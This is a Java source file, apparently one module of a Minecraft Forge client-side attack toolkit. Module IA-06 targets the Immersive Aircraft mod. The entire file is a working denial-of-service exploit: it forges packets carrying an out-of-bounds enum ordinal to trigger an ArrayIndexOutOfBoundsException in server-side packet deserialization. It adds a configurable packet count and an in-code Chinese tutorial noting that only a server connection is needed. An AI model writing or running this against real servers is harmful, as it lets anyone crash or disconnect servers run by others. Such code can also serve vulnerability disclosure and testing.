package com.redblue.red.modules.immersiveaircraft;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * IA-06: CommandMessage enum ordinal OOB -- server crash via AIOOBE.
 *
 * CommandMessage constructor does Key.values()[buf.readInt()] with no bounds
 * check. Sending ordinal outside 0-3 triggers ArrayIndexOutOfBoundsException
 * during packet deserialization in the Netty pipeline.
 *
 * Precondition: NONE. Only needs a connection to the server.
 *
 * Wire format (index 1): writeInt(key_ordinal) + writeDouble(fx)
 *                         + writeDouble(fy) + writeDouble(fz)
 */
public class IA06_EnumOobCrash implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("ic_air", "main");
    private static final int IDX_COMMAND = 1;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger",
                "⚠ 确认: 可能导致网络线程异常", false),
        ConfigParam.ofInt("ordinal_value", "枚举序数值", 99, -1, 999999)
                .visibleWhen("confirm_danger", "true"),
        ConfigParam.ofInt("packet_count", "发包数量", 1, 1, 10)
                .visibleWhen("confirm_danger", "true")
    );

    @Override public String id() { return "ia06_enum_oob_crash"; }
    @Override public String name() { return "枚举越界崩溃"; }

    @Override
    public String description() {
        return "发送越界枚举序数触发反序列化异常";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 勾选「⚠ 确认」开关\n"
            + "2. 设置越界的枚举序数值 (有效范围 0-3)\n"
            + "3. 点击「执行」发送\n\n"
            + "[原理]\n"
            + "- CommandMessage$Key 枚举: DISMOUNT(0), INVENTORY(1),\n"
            + "  BOOST(2), DAMAGE(3)\n"
            + "- 构造函数: Key.values()[buf.readInt()]\n"
            + "- 越界值触发 ArrayIndexOutOfBoundsException\n"
            + "- 异常在 Netty 管道中，可能断开连接或崩溃网络线程\n\n"
            + "[前置条件]\n"
            + "- 无。仅需连接到服务器";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("immersive_aircraft");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        if (!getParam("confirm_danger")
                .map(ConfigParam::getBool).orElse(false)) return;

        int ordinal = getParam("ordinal_value")
                .map(ConfigParam::getInt).orElse(99);
        int count = getParam("packet_count")
                .map(ConfigParam::getInt).orElse(1);

        for (int i = 0; i < count; i++) {
            sendOobCommand(ordinal);
        }
    }

    private void sendOobCommand(int ordinal) {
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_COMMAND);
            buf.writeInt(ordinal);
            buf.writeDouble(0.0);
            buf.writeDouble(0.0);
            buf.writeDouble(0.0);
        });
    }
}
